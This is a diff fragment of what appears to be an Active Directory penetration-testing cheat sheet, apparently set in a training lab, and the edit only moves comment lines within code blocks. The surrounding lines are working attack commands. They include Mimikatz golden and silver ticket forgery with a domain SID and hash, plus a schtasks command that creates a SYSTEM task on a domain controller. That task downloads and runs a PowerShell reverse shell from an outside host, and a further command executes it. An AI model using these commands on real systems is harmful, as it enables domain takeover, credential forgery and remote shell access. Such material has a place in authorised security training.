@@ -544,12 +544,12 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporat
 # Silver Ticket for service HOST
 Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'
 ```
-# Create a Scheduled task "STCheck" (download and execute a Powershell - Specifically a reverse shell)
 ```
+# Create a Scheduled task "STCheck" (download and execute a Powershell - Specifically a reverse shell)
 schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8000/InvokePowershellTcp.ps1''')'"
 ```
-# Execute Scheduled task (download and execute a Powershell - Specifically a reverse shell)
 ```
+# Execute Scheduled task (download and execute a Powershell - Specifically a reverse shell)
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
 ```
 
